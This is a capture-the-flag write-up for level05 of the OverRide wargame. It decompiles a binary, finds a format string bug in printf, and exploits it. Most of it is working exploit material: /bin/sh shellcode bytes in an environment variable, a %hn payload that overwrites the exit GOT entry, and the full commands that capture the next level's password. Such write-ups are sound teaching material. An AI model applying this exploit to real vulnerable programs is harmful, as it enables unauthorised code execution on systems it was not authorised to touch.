## Step 1: Static & Dynamic Analysis

```c
08048444    int32_t main(int32_t argc, char** argv, char** envp)
08048444    {
08048444        int32_t var_14 = 0;
08048475        void buffer;
08048475        fgets(&buffer, 100, __bss_start);
0804847a        int32_t var_14_1 = 0;
0804847a        
080484ed        while (true)
080484ed        {
080484ed            int32_t i = 0xffffffff;
080484f1            void* buffer_ptr = &buffer;
080484f1            
080484f3            while (i)
080484f3            {
080484f3                bool is_byte_exist = 0 != *(uint8_t*)buffer_ptr;
080484f3                buffer_ptr += 1;
080484f3                i -= 1;
080484f3                
080484f3                if (!is_byte_exist)
080484f3                    break;
080484f3            }
080484f3            
080484fe            if (var_14_1 >= ~i - 1)
080484fe                break;
080484fe            
080484a9            if (*(uint8_t*)(&buffer + var_14_1) > 64 && *(uint8_t*)(&buffer + var_14_1) <= 90)
080484c9                *(uint8_t*)(&buffer + var_14_1) ^= 32;
080484c9            
080484cb            var_14_1 += 1;
080484ed        }
080484ed        
08048507        printf(&buffer);
08048513        exit(0);
08048444    }
```

### Explatation
This binary reads user input into a buffer of 100 bytes using `fgets()`, then processes it by converting uppercase letters to lowercase before printing it with `printf()`. However, the vulnerability lies in the call to `printf()` with the buffer as only argument, which allows for a `format string attack`.

```bash
level05@OverRide:~$ python -c 'print("AAAA" + ("%x " * 15))' | ./level05 
aaaa64 f7fcfac0 f7ec3af9 ffffdbff ffffdbfe 0 ffffffff ffffdc84 f7fdb000 61616161 25207825 78252078 20782520 25207825 78252078
```

This confirms that we control the input processed by `printf()`. Additionally, we can see that our buffer appears at the 10th position in `printf()`'s stack view.

```asm
0x08048376 in exit@plt ()
(gdb) disas
Dump of assembler code for function exit@plt:
   0x08048370 <+0>:     jmp    *0x80497e0
=> 0x08048376 <+6>:     push   $0x18
   0x0804837b <+11>:    jmp    0x8048330
```

The function `exit()` is used at the end of `main()`, 
When `exit()` is called, `exit@plt` will jump to the addresses contained in `0x80497e0`, so if we can overwrite this GOT entry, we can redirect execution to our shellcode.

```bash
level05@OverRide:~$ env -i PAYLOAD=$(python -c 'print("\x90" * 1000 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh")') gdb ./level05
```

We creat an environement variable containing a shellcode and then start a debuging session with gdb.
The goal is to find the address where the shellcode is stored.

```
x/200s environ
...
0xffffdb91:      "PAYLOAD=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220
```

So the beginning of our shell code is `0xffffdb99` (`0xffffdb91` + `PAYLOAD=`).
Since writing a large value like `0xffffdb99` directly using a format string would either cause `printf()` to fail or take too long, we need to split the address into two parts. First, we write the lower 2 bytes, followed by the upper 2 bytes.

```python
>>> hex(0xffffdb99 + 100)
'0xffffdbfd'
>>> 0xdbfd
56317
>>> 0xffff
65535
>>> 56317 -4 -4
56309
>>> 65535 - 56317
9218
```

## Step 2: Exploiting the Binary
```bash
level05@OverRide:~$ python -c 'print("\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe2"[::-1] + "%56309d%10$hn" + "%9218d%11$hn")' > /tmp/exploit

level05@OverRide:~$ cat /tmp/exploit - | env -i PAYLOAD=$(python -c 'print("\x90" * 1000 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh")') ./level05

...
% cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```